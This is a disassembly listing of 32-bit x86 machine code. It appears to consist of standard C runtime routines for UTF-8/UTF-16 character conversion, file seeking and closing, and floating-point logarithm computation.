  40c148:	81 f9 ff ff 00 00    	cmp    $0xffff,%ecx
  40c14e:	76 05                	jbe    0x40c155
  40c150:	b9 fd ff 00 00       	mov    $0xfffd,%ecx
  40c155:	8b 45 08             	mov    0x8(%ebp),%eax
  40c158:	85 c0                	test   %eax,%eax
  40c15a:	74 03                	je     0x40c15f
  40c15c:	66 89 08             	mov    %cx,(%eax)
  40c15f:	8b c2                	mov    %edx,%eax
  40c161:	c9                   	leave
  40c162:	c3                   	ret
  40c163:	8b ff                	mov    %edi,%edi
  40c165:	55                   	push   %ebp
  40c166:	8b ec                	mov    %esp,%ebp
  40c168:	51                   	push   %ecx
  40c169:	51                   	push   %ecx
  40c16a:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40c16e:	53                   	push   %ebx
  40c16f:	56                   	push   %esi
  40c170:	57                   	push   %edi
  40c171:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40c174:	8b 3f                	mov    (%edi),%edi
  40c176:	0f 84 9c 00 00 00    	je     0x40c218
  40c17c:	8b 5d 10             	mov    0x10(%ebp),%ebx
  40c17f:	8b 75 08             	mov    0x8(%ebp),%esi
  40c182:	85 db                	test   %ebx,%ebx
  40c184:	74 68                	je     0x40c1ee
  40c186:	57                   	push   %edi
  40c187:	8d 4d ff             	lea    -0x1(%ebp),%ecx
  40c18a:	e8 68 ff ff ff       	call   0x40c0f7
  40c18f:	ff 75 14             	push   0x14(%ebp)
  40c192:	50                   	push   %eax
  40c193:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40c196:	57                   	push   %edi
  40c197:	50                   	push   %eax
  40c198:	e8 c0 02 00 00       	call   0x40c45d
  40c19d:	8b d0                	mov    %eax,%edx
  40c19f:	83 c4 10             	add    $0x10,%esp
  40c1a2:	83 fa ff             	cmp    $0xffffffff,%edx
  40c1a5:	74 5c                	je     0x40c203
  40c1a7:	85 d2                	test   %edx,%edx
  40c1a9:	74 4f                	je     0x40c1fa
  40c1ab:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40c1ae:	81 f9 ff ff 00 00    	cmp    $0xffff,%ecx
  40c1b4:	76 2b                	jbe    0x40c1e1
  40c1b6:	83 fb 01             	cmp    $0x1,%ebx
  40c1b9:	76 33                	jbe    0x40c1ee
  40c1bb:	81 e9 00 00 01 00    	sub    $0x10000,%ecx
  40c1c1:	4b                   	dec    %ebx
  40c1c2:	8b c1                	mov    %ecx,%eax
  40c1c4:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  40c1c7:	c1 e8 0a             	shr    $0xa,%eax
  40c1ca:	81 e1 ff 03 00 00    	and    $0x3ff,%ecx
  40c1d0:	0d 00 d8 00 00       	or     $0xd800,%eax
  40c1d5:	66 89 06             	mov    %ax,(%esi)
  40c1d8:	83 c6 02             	add    $0x2,%esi
  40c1db:	81 c9 00 dc 00 00    	or     $0xdc00,%ecx
  40c1e1:	66 89 0e             	mov    %cx,(%esi)
  40c1e4:	03 fa                	add    %edx,%edi
  40c1e6:	83 c6 02             	add    $0x2,%esi
  40c1e9:	83 eb 01             	sub    $0x1,%ebx
  40c1ec:	75 98                	jne    0x40c186
  40c1ee:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  40c1f1:	2b 75 08             	sub    0x8(%ebp),%esi
  40c1f4:	d1 fe                	sar    $1,%esi
  40c1f6:	89 3b                	mov    %edi,(%ebx)
  40c1f8:	eb 59                	jmp    0x40c253
  40c1fa:	33 ff                	xor    %edi,%edi
  40c1fc:	33 c0                	xor    %eax,%eax
  40c1fe:	66 89 06             	mov    %ax,(%esi)
  40c201:	eb eb                	jmp    0x40c1ee
  40c203:	8b 45 0c             	mov    0xc(%ebp),%eax
  40c206:	89 38                	mov    %edi,(%eax)
  40c208:	e8 ae b2 ff ff       	call   0x4074bb
  40c20d:	c7 00 2a 00 00 00    	movl   $0x2a,(%eax)
  40c213:	83 c8 ff             	or     $0xffffffff,%eax
  40c216:	eb 3d                	jmp    0x40c255
  40c218:	33 db                	xor    %ebx,%ebx
  40c21a:	eb 0d                	jmp    0x40c229
  40c21c:	85 f6                	test   %esi,%esi
  40c21e:	74 3a                	je     0x40c25a
  40c220:	83 fe 04             	cmp    $0x4,%esi
  40c223:	75 01                	jne    0x40c226
  40c225:	43                   	inc    %ebx
  40c226:	03 fe                	add    %esi,%edi
  40c228:	43                   	inc    %ebx
  40c229:	57                   	push   %edi
  40c22a:	8d 4d ff             	lea    -0x1(%ebp),%ecx
  40c22d:	e8 c5 fe ff ff       	call   0x40c0f7
  40c232:	ff 75 14             	push   0x14(%ebp)
  40c235:	50                   	push   %eax
  40c236:	57                   	push   %edi
  40c237:	6a 00                	push   $0x0
  40c239:	e8 1f 02 00 00       	call   0x40c45d
  40c23e:	8b f0                	mov    %eax,%esi
  40c240:	83 c4 10             	add    $0x10,%esp
  40c243:	83 fe ff             	cmp    $0xffffffff,%esi
  40c246:	75 d4                	jne    0x40c21c
  40c248:	e8 6e b2 ff ff       	call   0x4074bb
  40c24d:	c7 00 2a 00 00 00    	movl   $0x2a,(%eax)
  40c253:	8b c6                	mov    %esi,%eax
  40c255:	5f                   	pop    %edi
  40c256:	5e                   	pop    %esi
  40c257:	5b                   	pop    %ebx
  40c258:	c9                   	leave
  40c259:	c3                   	ret
  40c25a:	8b c3                	mov    %ebx,%eax
  40c25c:	eb f7                	jmp    0x40c255
  40c25e:	8b ff                	mov    %edi,%edi
  40c260:	55                   	push   %ebp
  40c261:	8b ec                	mov    %esp,%ebp
  40c263:	8b 45 08             	mov    0x8(%ebp),%eax
  40c266:	83 20 00             	andl   $0x0,(%eax)
  40c269:	83 60 04 00          	andl   $0x0,0x4(%eax)
  40c26d:	e8 49 b2 ff ff       	call   0x4074bb
  40c272:	c7 00 2a 00 00 00    	movl   $0x2a,(%eax)
  40c278:	83 c8 ff             	or     $0xffffffff,%eax
  40c27b:	5d                   	pop    %ebp
  40c27c:	c3                   	ret
  40c27d:	8b ff                	mov    %edi,%edi
  40c27f:	55                   	push   %ebp
  40c280:	8b ec                	mov    %esp,%ebp
  40c282:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40c285:	33 c0                	xor    %eax,%eax
  40c287:	38 01                	cmp    %al,(%ecx)
  40c289:	74 0c                	je     0x40c297
  40c28b:	3b 45 0c             	cmp    0xc(%ebp),%eax
  40c28e:	74 07                	je     0x40c297
  40c290:	40                   	inc    %eax
  40c291:	80 3c 08 00          	cmpb   $0x0,(%eax,%ecx,1)
  40c295:	75 f4                	jne    0x40c28b
  40c297:	5d                   	pop    %ebp
  40c298:	c3                   	ret
  40c299:	8b ff                	mov    %edi,%edi
  40c29b:	55                   	push   %ebp
  40c29c:	8b ec                	mov    %esp,%ebp
  40c29e:	51                   	push   %ecx
  40c29f:	51                   	push   %ecx
  40c2a0:	56                   	push   %esi
  40c2a1:	8b 75 08             	mov    0x8(%ebp),%esi
  40c2a4:	57                   	push   %edi
  40c2a5:	56                   	push   %esi
  40c2a6:	e8 e1 ce ff ff       	call   0x40918c
  40c2ab:	83 cf ff             	or     $0xffffffff,%edi
  40c2ae:	59                   	pop    %ecx
  40c2af:	3b c7                	cmp    %edi,%eax
  40c2b1:	75 11                	jne    0x40c2c4
  40c2b3:	e8 03 b2 ff ff       	call   0x4074bb
  40c2b8:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40c2be:	8b c7                	mov    %edi,%eax
  40c2c0:	8b d7                	mov    %edi,%edx
  40c2c2:	eb 4d                	jmp    0x40c311
  40c2c4:	ff 75 14             	push   0x14(%ebp)
  40c2c7:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  40c2ca:	51                   	push   %ecx
  40c2cb:	ff 75 10             	push   0x10(%ebp)
  40c2ce:	ff 75 0c             	push   0xc(%ebp)
  40c2d1:	50                   	push   %eax
  40c2d2:	ff 15 30 f1 40 00    	call   *0x40f130
  40c2d8:	85 c0                	test   %eax,%eax
  40c2da:	75 0f                	jne    0x40c2eb
  40c2dc:	ff 15 70 f0 40 00    	call   *0x40f070
  40c2e2:	50                   	push   %eax
  40c2e3:	e8 9d b1 ff ff       	call   0x407485
  40c2e8:	59                   	pop    %ecx
  40c2e9:	eb d3                	jmp    0x40c2be
  40c2eb:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40c2ee:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40c2f1:	23 c2                	and    %edx,%eax
  40c2f3:	3b c7                	cmp    %edi,%eax
  40c2f5:	74 c7                	je     0x40c2be
  40c2f7:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40c2fa:	8b ce                	mov    %esi,%ecx
  40c2fc:	83 e6 3f             	and    $0x3f,%esi
  40c2ff:	c1 f9 06             	sar    $0x6,%ecx
  40c302:	6b f6 38             	imul   $0x38,%esi,%esi
  40c305:	8b 0c 8d c8 70 41 00 	mov    0x4170c8(,%ecx,4),%ecx
  40c30c:	80 64 31 28 fd       	andb   $0xfd,0x28(%ecx,%esi,1)
  40c311:	5f                   	pop    %edi
  40c312:	5e                   	pop    %esi
  40c313:	c9                   	leave
  40c314:	c3                   	ret
  40c315:	8b ff                	mov    %edi,%edi
  40c317:	55                   	push   %ebp
  40c318:	8b ec                	mov    %esp,%ebp
  40c31a:	ff 75 14             	push   0x14(%ebp)
  40c31d:	ff 75 10             	push   0x10(%ebp)
  40c320:	ff 75 0c             	push   0xc(%ebp)
  40c323:	ff 75 08             	push   0x8(%ebp)
  40c326:	e8 6e ff ff ff       	call   0x40c299
  40c32b:	83 c4 10             	add    $0x10,%esp
  40c32e:	5d                   	pop    %ebp
  40c32f:	c3                   	ret
  40c330:	8b ff                	mov    %edi,%edi
  40c332:	55                   	push   %ebp
  40c333:	8b ec                	mov    %esp,%ebp
  40c335:	51                   	push   %ecx
  40c336:	e8 85 05 00 00       	call   0x40c8c0
  40c33b:	85 c0                	test   %eax,%eax
  40c33d:	74 1c                	je     0x40c35b
  40c33f:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40c342:	50                   	push   %eax
  40c343:	8d 45 08             	lea    0x8(%ebp),%eax
  40c346:	6a 01                	push   $0x1
  40c348:	50                   	push   %eax
  40c349:	e8 a8 05 00 00       	call   0x40c8f6
  40c34e:	83 c4 0c             	add    $0xc,%esp
  40c351:	85 c0                	test   %eax,%eax
  40c353:	74 06                	je     0x40c35b
  40c355:	66 8b 45 08          	mov    0x8(%ebp),%ax
  40c359:	c9                   	leave
  40c35a:	c3                   	ret
  40c35b:	b8 ff ff 00 00       	mov    $0xffff,%eax
  40c360:	c9                   	leave
  40c361:	c3                   	ret
  40c362:	8b ff                	mov    %edi,%edi
  40c364:	55                   	push   %ebp
  40c365:	8b ec                	mov    %esp,%ebp
  40c367:	56                   	push   %esi
  40c368:	8b 75 08             	mov    0x8(%ebp),%esi
  40c36b:	85 f6                	test   %esi,%esi
  40c36d:	75 15                	jne    0x40c384
  40c36f:	e8 47 b1 ff ff       	call   0x4074bb
  40c374:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  40c37a:	e8 7f b0 ff ff       	call   0x4073fe
  40c37f:	83 c8 ff             	or     $0xffffffff,%eax
  40c382:	eb 52                	jmp    0x40c3d6
  40c384:	8b 46 0c             	mov    0xc(%esi),%eax
  40c387:	57                   	push   %edi
  40c388:	83 cf ff             	or     $0xffffffff,%edi
  40c38b:	90                   	nop
  40c38c:	c1 e8 0d             	shr    $0xd,%eax
  40c38f:	a8 01                	test   $0x1,%al
  40c391:	74 39                	je     0x40c3cc
  40c393:	56                   	push   %esi
  40c394:	e8 ad dd ff ff       	call   0x40a146
  40c399:	56                   	push   %esi
  40c39a:	8b f8                	mov    %eax,%edi
  40c39c:	e8 62 fb ff ff       	call   0x40bf03
  40c3a1:	56                   	push   %esi
  40c3a2:	e8 33 e5 ff ff       	call   0x40a8da
  40c3a7:	50                   	push   %eax
  40c3a8:	e8 2a 06 00 00       	call   0x40c9d7
  40c3ad:	83 c4 10             	add    $0x10,%esp
  40c3b0:	85 c0                	test   %eax,%eax
  40c3b2:	79 05                	jns    0x40c3b9
  40c3b4:	83 cf ff             	or     $0xffffffff,%edi
  40c3b7:	eb 13                	jmp    0x40c3cc
  40c3b9:	83 7e 1c 00          	cmpl   $0x0,0x1c(%esi)
  40c3bd:	74 0d                	je     0x40c3cc
  40c3bf:	ff 76 1c             	push   0x1c(%esi)
  40c3c2:	e8 00 b7 ff ff       	call   0x407ac7
  40c3c7:	83 66 1c 00          	andl   $0x0,0x1c(%esi)
  40c3cb:	59                   	pop    %ecx
  40c3cc:	56                   	push   %esi
  40c3cd:	e8 2e 07 00 00       	call   0x40cb00
  40c3d2:	59                   	pop    %ecx
  40c3d3:	8b c7                	mov    %edi,%eax
  40c3d5:	5f                   	pop    %edi
  40c3d6:	5e                   	pop    %esi
  40c3d7:	5d                   	pop    %ebp
  40c3d8:	c3                   	ret
  40c3d9:	6a 10                	push   $0x10
  40c3db:	68 b8 4b 41 00       	push   $0x414bb8
  40c3e0:	e8 0b 7e ff ff       	call   0x4041f0
  40c3e5:	8b 75 08             	mov    0x8(%ebp),%esi
  40c3e8:	89 75 e0             	mov    %esi,-0x20(%ebp)
  40c3eb:	85 f6                	test   %esi,%esi
  40c3ed:	75 15                	jne    0x40c404
  40c3ef:	e8 c7 b0 ff ff       	call   0x4074bb
  40c3f4:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  40c3fa:	e8 ff af ff ff       	call   0x4073fe
  40c3ff:	83 c8 ff             	or     $0xffffffff,%eax
  40c402:	eb 3c                	jmp    0x40c440
  40c404:	8b 46 0c             	mov    0xc(%esi),%eax
  40c407:	90                   	nop
  40c408:	c1 e8 0c             	shr    $0xc,%eax
  40c40b:	56                   	push   %esi
  40c40c:	a8 01                	test   $0x1,%al
  40c40e:	74 08                	je     0x40c418
  40c410:	e8 eb 06 00 00       	call   0x40cb00
  40c415:	59                   	pop    %ecx
  40c416:	eb e7                	jmp    0x40c3ff
  40c418:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  40c41c:	e8 ef de ff ff       	call   0x40a310
  40c421:	59                   	pop    %ecx
  40c422:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40c426:	56                   	push   %esi
  40c427:	e8 36 ff ff ff       	call   0x40c362
  40c42c:	59                   	pop    %ecx
  40c42d:	8b f0                	mov    %eax,%esi
  40c42f:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  40c432:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40c439:	e8 15 00 00 00       	call   0x40c453
  40c43e:	8b c6                	mov    %esi,%eax
  40c440:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40c443:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40c44a:	59                   	pop    %ecx
  40c44b:	5f                   	pop    %edi
  40c44c:	5e                   	pop    %esi
  40c44d:	5b                   	pop    %ebx
  40c44e:	c9                   	leave
  40c44f:	c3                   	ret
  40c450:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  40c453:	ff 75 e0             	push   -0x20(%ebp)
  40c456:	e8 c9 de ff ff       	call   0x40a324
  40c45b:	59                   	pop    %ecx
  40c45c:	c3                   	ret
  40c45d:	8b ff                	mov    %edi,%edi
  40c45f:	55                   	push   %ebp
  40c460:	8b ec                	mov    %esp,%ebp
  40c462:	83 ec 24             	sub    $0x24,%esp
  40c465:	a1 04 60 41 00       	mov    0x416004,%eax
  40c46a:	33 c5                	xor    %ebp,%eax
  40c46c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40c46f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40c472:	53                   	push   %ebx
  40c473:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  40c476:	56                   	push   %esi
  40c477:	8b 75 14             	mov    0x14(%ebp),%esi
  40c47a:	89 5d dc             	mov    %ebx,-0x24(%ebp)
  40c47d:	57                   	push   %edi
  40c47e:	8b fb                	mov    %ebx,%edi
  40c480:	85 f6                	test   %esi,%esi
  40c482:	75 05                	jne    0x40c489
  40c484:	be 00 73 41 00       	mov    $0x417300,%esi
  40c489:	33 d2                	xor    %edx,%edx
  40c48b:	42                   	inc    %edx
  40c48c:	85 db                	test   %ebx,%ebx
  40c48e:	75 09                	jne    0x40c499
  40c490:	bb 36 f7 40 00       	mov    $0x40f736,%ebx
  40c495:	8b c2                	mov    %edx,%eax
  40c497:	eb 03                	jmp    0x40c49c
  40c499:	8b 45 10             	mov    0x10(%ebp),%eax
  40c49c:	f7 df                	neg    %edi
  40c49e:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40c4a1:	1b ff                	sbb    %edi,%edi
  40c4a3:	23 f9                	and    %ecx,%edi
  40c4a5:	85 c0                	test   %eax,%eax
  40c4a7:	75 08                	jne    0x40c4b1
  40c4a9:	6a fe                	push   $0xfffffffe
  40c4ab:	58                   	pop    %eax
  40c4ac:	e9 44 01 00 00       	jmp    0x40c5f5
  40c4b1:	33 c0                	xor    %eax,%eax
  40c4b3:	66 39 46 06          	cmp    %ax,0x6(%esi)
  40c4b7:	75 64                	jne    0x40c51d
  40c4b9:	8a 0b                	mov    (%ebx),%cl
  40c4bb:	43                   	inc    %ebx
  40c4bc:	88 4d ee             	mov    %cl,-0x12(%ebp)
  40c4bf:	84 c9                	test   %cl,%cl
  40c4c1:	78 15                	js     0x40c4d8
  40c4c3:	85 ff                	test   %edi,%edi
  40c4c5:	74 05                	je     0x40c4cc
  40c4c7:	0f b6 c1             	movzbl %cl,%eax
  40c4ca:	89 07                	mov    %eax,(%edi)
  40c4cc:	33 c0                	xor    %eax,%eax
  40c4ce:	84 c9                	test   %cl,%cl
  40c4d0:	0f 95 c0             	setne  %al
  40c4d3:	e9 1d 01 00 00       	jmp    0x40c5f5
  40c4d8:	8a c1                	mov    %cl,%al
  40c4da:	24 e0                	and    $0xe0,%al
  40c4dc:	3c c0                	cmp    $0xc0,%al
  40c4de:	75 04                	jne    0x40c4e4
  40c4e0:	b0 02                	mov    $0x2,%al
  40c4e2:	eb 1a                	jmp    0x40c4fe
  40c4e4:	8a c1                	mov    %cl,%al
  40c4e6:	24 f0                	and    $0xf0,%al
  40c4e8:	3c e0                	cmp    $0xe0,%al
  40c4ea:	75 04                	jne    0x40c4f0
  40c4ec:	b0 03                	mov    $0x3,%al
  40c4ee:	eb 0e                	jmp    0x40c4fe
  40c4f0:	8a c1                	mov    %cl,%al
  40c4f2:	24 f8                	and    $0xf8,%al
  40c4f4:	3c f0                	cmp    $0xf0,%al
  40c4f6:	0f 85 f2 00 00 00    	jne    0x40c5ee
  40c4fc:	b0 04                	mov    $0x4,%al
  40c4fe:	88 45 ef             	mov    %al,-0x11(%ebp)
  40c501:	88 45 ed             	mov    %al,-0x13(%ebp)
  40c504:	6a 07                	push   $0x7
  40c506:	0f b6 c0             	movzbl %al,%eax
  40c509:	59                   	pop    %ecx
  40c50a:	2b c8                	sub    %eax,%ecx
  40c50c:	0f b6 45 ee          	movzbl -0x12(%ebp),%eax
  40c510:	8a 6d ed             	mov    -0x13(%ebp),%ch
  40c513:	d3 e2                	shl    %cl,%edx
  40c515:	8a 4d ef             	mov    -0x11(%ebp),%cl
  40c518:	4a                   	dec    %edx
  40c519:	23 d0                	and    %eax,%edx
  40c51b:	eb 25                	jmp    0x40c542
  40c51d:	8a 4e 04             	mov    0x4(%esi),%cl
  40c520:	8b 16                	mov    (%esi),%edx
  40c522:	8a c1                	mov    %cl,%al
  40c524:	8a 6e 06             	mov    0x6(%esi),%ch
  40c527:	2c 02                	sub    $0x2,%al
  40c529:	3c 02                	cmp    $0x2,%al
  40c52b:	0f 87 bd 00 00 00    	ja     0x40c5ee
  40c531:	80 fd 01             	cmp    $0x1,%ch
  40c534:	0f 82 b4 00 00 00    	jb     0x40c5ee
  40c53a:	3a e9                	cmp    %cl,%ch
  40c53c:	0f 83 ac 00 00 00    	jae    0x40c5ee
  40c542:	0f b6 c5             	movzbl %ch,%eax
  40c545:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40c548:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40c54b:	39 45 e0             	cmp    %eax,-0x20(%ebp)
  40c54e:	73 06                	jae    0x40c556
  40c550:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40c553:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40c556:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40c559:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  40c55c:	29 45 e8             	sub    %eax,-0x18(%ebp)
  40c55f:	eb 19                	jmp    0x40c57a
  40c561:	8a 23                	mov    (%ebx),%ah
  40c563:	43                   	inc    %ebx
  40c564:	ff 45 e8             	incl   -0x18(%ebp)
  40c567:	8a c4                	mov    %ah,%al
  40c569:	24 c0                	and    $0xc0,%al
  40c56b:	3c 80                	cmp    $0x80,%al
  40c56d:	75 7f                	jne    0x40c5ee
  40c56f:	0f b6 c4             	movzbl %ah,%eax
  40c572:	83 e0 3f             	and    $0x3f,%eax
  40c575:	c1 e2 06             	shl    $0x6,%edx
  40c578:	0b d0                	or     %eax,%edx
  40c57a:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40c57d:	39 45 e8             	cmp    %eax,-0x18(%ebp)
  40c580:	72 df                	jb     0x40c561
  40c582:	8b 5d e0             	mov    -0x20(%ebp),%ebx
  40c585:	3b c3                	cmp    %ebx,%eax
  40c587:	73 18                	jae    0x40c5a1
  40c589:	2a 6d e4             	sub    -0x1c(%ebp),%ch
  40c58c:	0f b6 c1             	movzbl %cl,%eax
  40c58f:	66 89 46 04          	mov    %ax,0x4(%esi)
  40c593:	0f b6 c5             	movzbl %ch,%eax
  40c596:	89 16                	mov    %edx,(%esi)
  40c598:	66 89 46 06          	mov    %ax,0x6(%esi)
  40c59c:	e9 08 ff ff ff       	jmp    0x40c4a9
  40c5a1:	81 fa 00 d8 00 00    	cmp    $0xd800,%edx
  40c5a7:	72 08                	jb     0x40c5b1
  40c5a9:	81 fa ff df 00 00    	cmp    $0xdfff,%edx
  40c5af:	76 3d                	jbe    0x40c5ee
  40c5b1:	81 fa ff ff 10 00    	cmp    $0x10ffff,%edx
  40c5b7:	77 35                	ja     0x40c5ee
  40c5b9:	0f b6 c1             	movzbl %cl,%eax
  40c5bc:	c7 45 f0 80 00 00 00 	movl   $0x80,-0x10(%ebp)
  40c5c3:	c7 45 f4 00 08 00 00 	movl   $0x800,-0xc(%ebp)
  40c5ca:	c7 45 f8 00 00 01 00 	movl   $0x10000,-0x8(%ebp)
  40c5d1:	3b 54 85 e8          	cmp    -0x18(%ebp,%eax,4),%edx
  40c5d5:	72 17                	jb     0x40c5ee
  40c5d7:	85 ff                	test   %edi,%edi
  40c5d9:	74 02                	je     0x40c5dd
  40c5db:	89 17                	mov    %edx,(%edi)
  40c5dd:	83 26 00             	andl   $0x0,(%esi)
  40c5e0:	83 66 04 00          	andl   $0x0,0x4(%esi)
  40c5e4:	f7 da                	neg    %edx
  40c5e6:	1b d2                	sbb    %edx,%edx
  40c5e8:	23 d3                	and    %ebx,%edx
  40c5ea:	8b c2                	mov    %edx,%eax
  40c5ec:	eb 07                	jmp    0x40c5f5
  40c5ee:	56                   	push   %esi
  40c5ef:	e8 6a fc ff ff       	call   0x40c25e
  40c5f4:	59                   	pop    %ecx
  40c5f5:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40c5f8:	5f                   	pop    %edi
  40c5f9:	5e                   	pop    %esi
  40c5fa:	33 cd                	xor    %ebp,%ecx
  40c5fc:	5b                   	pop    %ebx
  40c5fd:	e8 43 71 ff ff       	call   0x403745
  40c602:	c9                   	leave
  40c603:	c3                   	ret
  40c604:	cc                   	int3
  40c605:	cc                   	int3
  40c606:	cc                   	int3
  40c607:	cc                   	int3
  40c608:	cc                   	int3
  40c609:	cc                   	int3
  40c60a:	cc                   	int3
  40c60b:	cc                   	int3
  40c60c:	cc                   	int3
  40c60d:	cc                   	int3
  40c60e:	cc                   	int3
  40c60f:	cc                   	int3
  40c610:	83 3d 2c 73 41 00 00 	cmpl   $0x0,0x41732c
  40c617:	74 32                	je     0x40c64b
  40c619:	83 ec 08             	sub    $0x8,%esp
  40c61c:	0f ae 5c 24 04       	stmxcsr 0x4(%esp)
  40c621:	8b 44 24 04          	mov    0x4(%esp),%eax
  40c625:	25 80 7f 00 00       	and    $0x7f80,%eax
  40c62a:	3d 80 1f 00 00       	cmp    $0x1f80,%eax
  40c62f:	75 0f                	jne    0x40c640
  40c631:	d9 3c 24             	fnstcw (%esp)
  40c634:	66 8b 04 24          	mov    (%esp),%ax
  40c638:	66 83 e0 7f          	and    $0x7f,%ax
  40c63c:	66 83 f8 7f          	cmp    $0x7f,%ax
  40c640:	8d 64 24 08          	lea    0x8(%esp),%esp
  40c644:	75 05                	jne    0x40c64b
  40c646:	e9 05 05 00 00       	jmp    0x40cb50
  40c64b:	83 ec 0c             	sub    $0xc,%esp
  40c64e:	dd 14 24             	fstl   (%esp)
  40c651:	e8 82 0c 00 00       	call   0x40d2d8
  40c656:	e8 0d 00 00 00       	call   0x40c668
  40c65b:	83 c4 0c             	add    $0xc,%esp
  40c65e:	c3                   	ret
  40c65f:	8d 54 24 04          	lea    0x4(%esp),%edx
  40c663:	e8 2d 0c 00 00       	call   0x40d295
  40c668:	52                   	push   %edx
  40c669:	9b d9 3c 24          	fstcw  (%esp)
  40c66d:	74 4c                	je     0x40c6bb
  40c66f:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40c673:	66 81 3c 24 7f 02    	cmpw   $0x27f,(%esp)
  40c679:	74 06                	je     0x40c681
  40c67b:	d9 2d 38 33 41 00    	fldcw  0x413338
  40c681:	a9 00 00 f0 7f       	test   $0x7ff00000,%eax
  40c686:	74 5e                	je     0x40c6e6
  40c688:	a9 00 00 00 80       	test   $0x80000000,%eax
  40c68d:	75 41                	jne    0x40c6d0
  40c68f:	d9 ec                	fldlg2
  40c691:	d9 c9                	fxch   %st(1)
  40c693:	d9 f1                	fyl2x
  40c695:	83 3d 08 73 41 00 00 	cmpl   $0x0,0x417308
  40c69c:	0f 85 4c 0c 00 00    	jne    0x40d2ee
  40c6a2:	8d 0d 20 31 41 00    	lea    0x413120,%ecx
  40c6a8:	ba 1b 00 00 00       	mov    $0x1b,%edx
  40c6ad:	e9 49 0c 00 00       	jmp    0x40d2fb
  40c6b2:	a9 00 00 00 80       	test   $0x80000000,%eax
  40c6b7:	75 17                	jne    0x40c6d0
  40c6b9:	eb d4                	jmp    0x40c68f
  40c6bb:	a9 ff ff 0f 00       	test   $0xfffff,%eax
  40c6c0:	75 1d                	jne    0x40c6df
  40c6c2:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
  40c6c7:	75 16                	jne    0x40c6df
  40c6c9:	25 00 00 00 80       	and    $0x80000000,%eax
  40c6ce:	74 c5                	je     0x40c695
  40c6d0:	dd d8                	fstp   %st(0)
  40c6d2:	db 2d f0 32 41 00    	fldt   0x4132f0
  40c6d8:	b8 01 00 00 00       	mov    $0x1,%eax
  40c6dd:	eb 22                	jmp    0x40c701
  40c6df:	e8 98 0b 00 00       	call   0x40d27c
  40c6e4:	eb 1b                	jmp    0x40c701
  40c6e6:	a9 ff ff 0f 00       	test   $0xfffff,%eax
  40c6eb:	75 c5                	jne    0x40c6b2
  40c6ed:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
  40c6f2:	75 be                	jne    0x40c6b2
  40c6f4:	dd d8                	fstp   %st(0)
  40c6f6:	db 2d 9a 32 41 00    	fldt   0x41329a
  40c6fc:	b8 02 00 00 00       	mov    $0x2,%eax
  40c701:	83 3d 08 73 41 00 00 	cmpl   $0x0,0x417308
  40c708:	0f 85 e0 0b 00 00    	jne    0x40d2ee
  40c70e:	8d 0d 20 31 41 00    	lea    0x413120,%ecx
  40c714:	ba 1b 00 00 00       	mov    $0x1b,%edx
  40c719:	e8 d9 0c 00 00       	call   0x40d3f7
  40c71e:	5a                   	pop    %edx
  40c71f:	c3                   	ret
  40c720:	83 3d 2c 73 41 00 00 	cmpl   $0x0,0x41732c
  40c727:	0f 84 fa 0e 00 00    	je     0x40d627
  40c72d:	83 ec 08             	sub    $0x8,%esp
  40c730:	0f ae 5c 24 04       	stmxcsr 0x4(%esp)
  40c735:	8b 44 24 04          	mov    0x4(%esp),%eax
  40c739:	25 80 7f 00 00       	and    $0x7f80,%eax
  40c73e:	3d 80 1f 00 00       	cmp    $0x1f80,%eax
  40c743:	75 0f                	jne    0x40c754
  40c745:	d9 3c 24             	fnstcw (%esp)
  40c748:	66 8b 04 24          	mov    (%esp),%ax
  40c74c:	66 83 e0 7f          	and    $0x7f,%ax
  40c750:	66 83 f8 7f          	cmp    $0x7f,%ax
  40c754:	8d 64 24 08          	lea    0x8(%esp),%esp
  40c758:	0f 85 c9 0e 00 00    	jne    0x40d627
  40c75e:	eb 00                	jmp    0x40c760
  40c760:	f3 0f 7e 44 24 04    	movq   0x4(%esp),%xmm0
  40c766:	66 0f 28 15 40 31 41 	movapd 0x413140,%xmm2
  40c76d:	00 
  40c76e:	66 0f 28 c8          	movapd %xmm0,%xmm1
  40c772:	66 0f 28 f8          	movapd %xmm0,%xmm7
  40c776:	66 0f 73 d0 34       	psrlq  $0x34,%xmm0
  40c77b:	66 0f 7e c0          	movd   %xmm0,%eax
  40c77f:	66 0f 54 05 60 31 41 	andpd  0x413160,%xmm0
  40c786:	00 
  40c787:	66 0f fa d0          	psubd  %xmm0,%xmm2
  40c78b:	66 0f d3 ca          	psrlq  %xmm2,%xmm1
  40c78f:	a9 00 08 00 00       	test   $0x800,%eax
  40c794:	74 4c                	je     0x40c7e2
  40c796:	3d ff 0b 00 00       	cmp    $0xbff,%eax
